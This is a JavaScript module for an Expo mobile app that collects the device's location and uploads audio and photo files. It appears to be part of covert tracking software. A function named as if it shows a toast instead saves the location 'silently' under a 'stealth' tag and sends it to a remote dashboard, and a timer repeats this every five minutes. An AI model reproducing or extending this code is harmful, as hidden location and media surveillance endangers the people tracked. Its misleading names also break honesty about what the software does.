import * as Location from 'expo-location';
import { sendRecordingEvent, uploadAudioFile, uploadPhotoFile } from './ApiService';
import { addAudioRecordingData, addLocationData } from './DataStorageService';

export async function fetchLocation() {
  try {
    const { status } = await Location.requestForegroundPermissionsAsync();
    if (status !== 'granted') return { latitude: 0, longitude: 0 };

    const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Highest });
    return { latitude: loc.coords.latitude, longitude: loc.coords.longitude };
  } catch (e) {
    console.error("Failed to fetch location:", e);
    return { latitude: 0, longitude: 0 };
  }
}

export async function fetchLocationAndUploadAudio(uri, duration = null) {
  const loc = await fetchLocation();
  
  console.log('🎤 Storing audio data with duration:', duration, 'uri:', uri);
  
  // Store audio recording data locally
  await addAudioRecordingData(uri, loc.latitude, loc.longitude, duration, new Date().toISOString(), 'recording');

  uploadAudioFile(uri);
}

export async function fetchLocationAndUploadPhoto(uri) {
  const loc = await fetchLocation();
  // optional: send event if needed
  uploadPhotoFile(uri);
}

export async function fetchLocationAndShowToast() {
  try {
    console.log('📍 Fetching location for dashboard update...');
    
    const { status } = await Location.getForegroundPermissionsAsync();
    if (status !== 'granted') {
      console.warn('⚠️ Location permission not granted, cannot send location update');
      return { latitude: 0, longitude: 0 };
    }

    const loc = await Location.getCurrentPositionAsync({ 
      accuracy: Location.Accuracy.Highest,
      timeoutMs: 10000, // 10 second timeout
    });
    
    console.log(`📍 Location obtained: ${loc.coords.latitude}, ${loc.coords.longitude}`);
    
    // Store location data locally (silently)
    await addLocationData(loc.coords.latitude, loc.coords.longitude, new Date().toISOString(), 'stealth');
    
    // Also send to server every tick
    console.log('📍 Sending location to dashboard...');
    const result = await sendRecordingEvent('foreground_location', loc.coords.latitude, loc.coords.longitude);
    
    if (result && result.success !== false) {
      console.log('✅ Location sent successfully to dashboard');
    } else {
      console.error('❌ Failed to send location to dashboard:', result?.error || 'Unknown error');
    }
    
    return { latitude: loc.coords.latitude, longitude: loc.coords.longitude };
  } catch (e) {
    console.error("❌ Failed to fetch/send location:", e);
    console.error("❌ Error details:", e.message);
    return { latitude: 0, longitude: 0 };
  }
}

let locationInterval = null;
let locationUpdateCount = 0;

export function startLocationToastUpdates() {
  if (locationInterval) {
    console.log('⚠️ Location updates already running, stopping previous interval...');
    clearInterval(locationInterval);
  }
  
  locationUpdateCount = 0;
  console.log('📍 Starting location updates - will send to dashboard every 5 minutes (300 seconds)');
  
  // Run every 300,000ms (5 minutes) - sends location to dashboard automatically
  locationInterval = setInterval(async () => {
    locationUpdateCount++;
    console.log(`📍 ⏰ Location update triggered (count: ${locationUpdateCount}) - fetching and sending to dashboard...`);
    await fetchLocationAndShowToast();
  }, 300000); // 5 minutes
  
  // Show first location immediately on start
  console.log('📍 Sending initial location immediately...');
  fetchLocationAndShowToast();
}

export function stopLocationToastUpdates() {
  if (locationInterval) {
    clearInterval(locationInterval);
    locationInterval = null;
    console.log(`📍 Location updates stopped (sent ${locationUpdateCount} updates total)`);
    locationUpdateCount = 0;
  }
}

/**
 * Check if location updates are running
 */
export function isLocationUpdatesActive() {
  return locationInterval !== null;
}

/**
 * Get location update statistics
 */
export function getLocationUpdateStats() {
  return {
    isActive: locationInterval !== null,
    updateCount: locationUpdateCount,
  };
}

// Default export for Expo Router compatibility
export default {
  fetchLocation,
  fetchLocationAndUploadAudio,
  fetchLocationAndUploadPhoto,
  fetchLocationAndShowToast,
  startLocationToastUpdates,
  stopLocationToastUpdates,
  isLocationUpdatesActive,
  getLocationUpdateStats,
};
